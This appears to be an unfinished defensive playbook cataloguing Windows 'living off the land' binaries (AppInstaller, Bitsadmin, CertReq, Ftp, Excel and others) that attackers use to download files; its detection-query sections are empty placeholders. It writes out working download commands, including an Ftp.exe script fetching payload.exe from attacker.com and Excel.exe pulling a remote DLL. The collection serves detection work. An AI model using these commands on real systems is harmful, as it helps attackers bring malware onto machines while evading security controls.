# LOLBAS Downloaders

## Objective

This playbook will examine "living off the land binaries" that are used as malicious downloaders. These were taken from the [LOLBAS Project](https://lolbas-project.github.io/).

## Background

This playbook will examine the following "living off the land binaries" that are used as malicious downloaders:

|Executable|Description|
|----------|-----------|
|`AppInstaller.exe`|Tool used for installation of AppX/MSIX applications on Windows 10|
|`Bitsadmin.exe`|Used for managing background intelligent transfer|
|`CertReq.exe`|Used for requesting and managing certificates|
|`Desktopimgdownldr.exe`|Windows binary used to configure lockscreen/desktop image|
|`Diantz.exe`|Binary that package existing files into a cabinet (.cab) file|
|`Esentutl.exe`|Binary for working with Microsoft Joint Engine Technology (JET) database|
|`Excel.exe`|Microsoft Office binary|
|`Expand.exe`|Binary that expands one or more compressed files|
|`Extrac32.exe`|None|
|`Findstr.exe`|None|
|`Ftp.exe`|A binary designed for connecting to FTP servers|
|`GfxDownloadWrapper.exe`|Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.|
|`Hh.exe`|Binary used for processing chm files in Windows|
|`Ieexec.exe`|The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.|
|`Makecab.exe`|Binary to package existing files into a cabinet (.cab) file|
|`MpCmdRun.exe`|Binary part of Windows Defender. Used to manage settings in Windows Defender|
|`Powerpnt.exe`|Microsoft Office binary.|
|`Replace.exe`|Used to replace file with another file|
|`Squirrel.exe`|Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.|
|`Update.exe`|Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.|
|`Winword.exe`|Microsoft Office binary|
|`Wsl.exe`|Windows subsystem for Linux executable|
|`Xwizard.exe`|None|




## AppInstaller.exe

Tool used for installation of AppX/MSIX applications on Windows 10

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Wade Hickey (@notwhickey)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/notwhickey/status/1333900137232523264</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw`|AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\&lt;RANDOM-8-CHAR-DIRECTORY&gt;|


 

#### Search Queries


> Analytic Goes Here!


 
## Bitsadmin.exe

Used for managing background intelligent transfer

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1096</li><li>T1105</li><li>T1218</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>ADS</li><li>Download</li><li>Copy</li><li>Execute</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\bitsadmin.exe`</li><li>`C:\Windows\SysWOW64\bitsadmin.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Rob Fuller (@mubix)</li><li>Chris Gates (@carnal0wnage)</li><li>Oddvar Moe (@oddvarmoe)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - slide 53</li><li>https://www.youtube.com/watch?v=_8xJaaQlpBo</li><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1`|Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.|

 

#### Search Queries


> Analytic Goes Here!


 
## CertReq.exe

Used for requesting and managing certificates

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li><li>Upload</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\certreq.exe`</li><li>`C:\Windows\SysWOW64\certreq.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>David Middlehurst (@dtmsecurity)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://dtm.uk/certreq</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt`|Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory|


 

#### Search Queries


> Analytic Goes Here!


 
## Desktopimgdownldr.exe

Windows binary used to configure lockscreen/desktop image

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`c:\windows\system32\desktopimgdownldr.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Gal Kristal (@gal_kristal)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`set &#34;SYSTEMROOT=C:\Windows\Temp&#34; &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr`|Downloads the file and sets it as the computer&#39;s lockscreen|


 

#### Search Queries


> Analytic Goes Here!


 
## Diantz.exe

Binary that package existing files into a cabinet (.cab) file

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1096</li><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>ADS</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.</li><li>Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`c:\windows\system32\diantz.exe`</li><li>`c:\windows\syswow64\diantz.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Tamir Yehuda (@tim8288)</li><li>Hai Vaknin (@vakninhai)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diantz</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab`|Download and compress a remote file and store it in a cab file on local machine.|


 

#### Search Queries


> Analytic Goes Here!


 
## Esentutl.exe

Binary for working with Microsoft Joint Engine Technology (JET) database

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li><li>T1096</li><li>T1003</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Copy</li><li>ADS</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li><li>Windows 10, Windows 2016 Server, Windows 2019 Server</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\esentutl.exe`</li><li>`C:\Windows\SysWOW64\esentutl.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>egre55 (@egre55)</li><li>Mike Cary (grayfold3d)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/egre55/status/985994639202283520</li><li>https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/</li><li>https://twitter.com/bohops/status/1094810861095534592</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o`|Copies the source EXE to the destination EXE file|


 

#### Search Queries


> Analytic Goes Here!


 
## Excel.exe

Microsoft Office binary

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Excel.exe`</li><li>`C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Excel.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office16\Excel.exe`</li><li>`C:\Program Files\Microsoft Office\Office16\Excel.exe`</li><li>`C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Excel.exe`</li><li>`C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Excel.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office15\Excel.exe`</li><li>`C:\Program Files\Microsoft Office\Office15\Excel.exe`</li><li>`C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Excel.exe`</li><li>`C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Excel.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office14\Excel.exe`</li><li>`C:\Program Files\Microsoft Office\Office14\Excel.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office12\Excel.exe`</li><li>`C:\Program Files\Microsoft Office\Office12\Excel.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Reegun J (OCBC Bank) (@reegun21)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/reegun21/status/1150032506504151040</li><li>https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191</li></ul></div>|

 


#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`Excel.exe http://192.168.1.10/TeamsAddinLoader.dll`|Downloads payload from remote server|


 

#### Search Queries


> Analytic Goes Here!


 
## Expand.exe

Binary that expands one or more compressed files

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li><li>T1096</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li><li>Copy</li><li>ADS</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\Expand.exe`</li><li>`C:\Windows\SysWOW64\Expand.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Rahmat Nurfauzi (@infosecn1nja)</li><li>Oddvar Moe (@oddvarmoe)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/infosecn1nja/status/986628482858807297</li><li>https://twitter.com/Oddvarmoe/status/986709068759949319</li></ul></div>|

 
 

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`expand \\webdav\folder\file.bat c:\ADS\file.bat`|Copies source file to destination.|


 

#### Search Queries


> Analytic Goes Here!


 
## Extrac32.exe

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1096</li><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>ADS</li><li>Download</li><li>Copy</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\extrac32.exe`</li><li>`C:\Windows\SysWOW64\extrac32.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>egre55 (@egre55)</li><li>Oddvar Moe (@oddvarmoe)</li><li>Hai Vaknin(Lux (@VakninHai)</li><li>Tamir Yehuda (@tim8288)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</li><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li><li>https://twitter.com/egre55/status/985994639202283520</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt`|Copy the source file to the destination file and overwrite it.|


 

#### Search Queries


> Analytic Goes Here!


 
## Findstr.exe

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1096</li><li>T1081</li><li>T1185</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>ADS</li><li>Credentials</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\findstr.exe`</li><li>`C:\Windows\SysWOW64\findstr.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Oddvar Moe (@oddvarmoe)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</li><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li></ul></div>|


 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`findstr /V /L foo \\webdavserver\folder\file.exe &gt; c:\ADS\file.exe`|Searches for the string `foo`, since it does not exist (/V) file.exe is downloaded to the target file.|


 

#### Search Queries


> Analytic Goes Here!



## Ftp.exe

A binary designed for connecting to FTP servers

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1218</li><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Execute</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 7, Windows 8, Windows 8.1, Windows 10</li><li>Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\ftp.exe`</li><li>`C:\Windows\SysWOW64\ftp.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Casey Smith (@subtee)</li><li>BennyHusted ()</li><li>Amit Serper (@0xAmit )</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/0xAmit/status/1070063130636640256</li><li>https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939</li><li>https://ss64.com/nt/ftp.html</li><li>https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/</li></ul></div>|


 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`cmd.exe /c &#34;@echo open attacker.com 21&gt;ftp.txt&amp;@echo USER attacker&gt;&gt;ftp.txt&amp;@echo PASS PaSsWoRd&gt;&gt;ftp.txt&amp;@echo binary&gt;&gt;ftp.txt&amp;@echo GET /payload.exe&gt;&gt;ftp.txt&amp;@echo quit&gt;&gt;ftp.txt&amp;@ftp -s:ftp.txt -v&#34;`|Download|


 

#### Search Queries


> Analytic Goes Here!


 
## GfxDownloadWrapper.exe

Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`c:\windows\system32\driverstore\filerepository\64kb6472.inf_amd64_3daef03bbe98572b\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_0e9c57ae3396e055\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_209bd95d56b1ac2d\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_3fa2a843f8b7f16d\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_85c860f05274baa0\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_f7412e3e3404de80\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_feb9f1cf05b0de58\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_component.inf_amd64_0219cc1c7085a93f\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_component.inf_amd64_df4f60b1cae9b14a\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_16eb18b0e2526e57\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_1c77f1231c19bc72\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_31c60cc38cfcca28\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_82f69cea8b2d928f\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_b4d94f3e41ceb839\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_0606619cc97463de\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_0e95edab338ad669\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_22aac1442d387216\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_2461d914696db722\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_29d727269a34edf5\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_2caf76dbce56546d\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_353320edb98da643\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_4ea0ed0af1507894\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_56a48f4f1c2da7a7\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_64f23fdadb76a511\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_668dd0c6d3f9fa0e\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_6be8e5b7f731a6e5\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_6dad7e4e9a8fa889\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_6df442103a1937a4\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_767e7683f9ad126c\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_8644298f665a12c4\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_868acf86149aef5d\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_92cf9d9d84f1d3db\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_93239c65f222d453\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_9de8154b682af864\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_a7428663aca90897\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_ad7cb5e55a410add\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_afbf41cf8ab202d7\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_d193c96475eaa96e\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_db953c52208ada71\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_e7523682cc7528cc\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_e9f341319ca84274\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_f3a64c75ee4defb7\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_f51939e52b944f4b\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch_comp.inf_amd64_4938423c9b9639d7\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch_comp.inf_amd64_c8e108d4a62c59d5\`</li><li>`c:\windows\system32\driverstore\filerepository\cui_dch_comp.inf_amd64_deecec7d232ced2b\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_01ee1299f4982efe\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_02edfc87000937e4\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0541b698fc6e40b0\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0707757077710fff\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0b3e3ed3ace9602a\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0cff362f9dff4228\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_16ed7d82b93e4f68\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1a33d2f73651d989\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1aca2a92a37fce23\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1af2dd3e4df5fd61\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1d571527c7083952\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_23f7302c2b9ee813\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_24de78387e6208e4\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_250db833a1cd577e\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_25e7c5a58c052bc5\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_28d80681d3523b1c\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_2dda3b1147a3a572\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_31ba00ea6900d67d\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_329877a66f240808\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_42af9f4718aa1395\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_4645af5c659ae51a\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_48c2e68e54c92258\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_48e7e903a369eae2\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_491d20003583dabe\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_4b34c18659561116\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_51ce968bf19942c2\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_555cfc07a674ecdd\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_561bd21d54545ed3\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_579a75f602cc2dce\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_57f66a4f0a97f1a3\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_587befb80671fb38\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_62f096fe77e085c0\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_6ae0ddbb4a38e23c\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_6bb02522ea3fdb0d\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_6d34ac0763025a06\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_712b6a0adbaabc0a\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_78b09d9681a2400f\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_842874489af34daa\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_88084eb1fe7cebc3\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_89033455cb08186f\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_8a9535cd18c90bc3\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_8c1fc948b5a01c52\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_9088b61921a6ff9f\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_90f68cd0dc48b625\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_95cb371d046d4b4c\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_a58de0cf5f3e9dca\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_abe9d37302f8b1ae\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_acb3edda7b82982f\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_aebc5a8535dd3184\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_b5d4c82c67b39358\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_b846bbf1e81ea3cf\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_babb2e8b8072ff3b\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_bc75cebf5edbbc50\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_be91293cf20d4372\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c11f4d5f0bc4c592\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c4e5173126d31cf0\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c4f600ffe34acc7b\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c8634ed19e331cda\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c9081e50bcffa972\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_ceddadac8a2b489e\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_d4406f0ad6ec2581\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_d5877a2e0e6374b6\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_d8ca5f86add535ef\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_e8abe176c7b553b5\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_eabb3ac2c517211f\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_f8d8be8fea71e1a0\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_fe5e116bb07c0629\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_fe73d2ebaa05fb95\`</li><li>`c:\windows\system32\driverstore\filerepository\igdlh64_kbl_kit127397.inf_amd64_e1da8ee9e92ccadb\`</li><li>`c:\windows\system32\driverstore\filerepository\k127153.inf_amd64_364f43f2a27f7bd7\`</li><li>`c:\windows\system32\driverstore\filerepository\k127153.inf_amd64_3f3936d8dec668b8\`</li><li>`c:\windows\system32\driverstore\filerep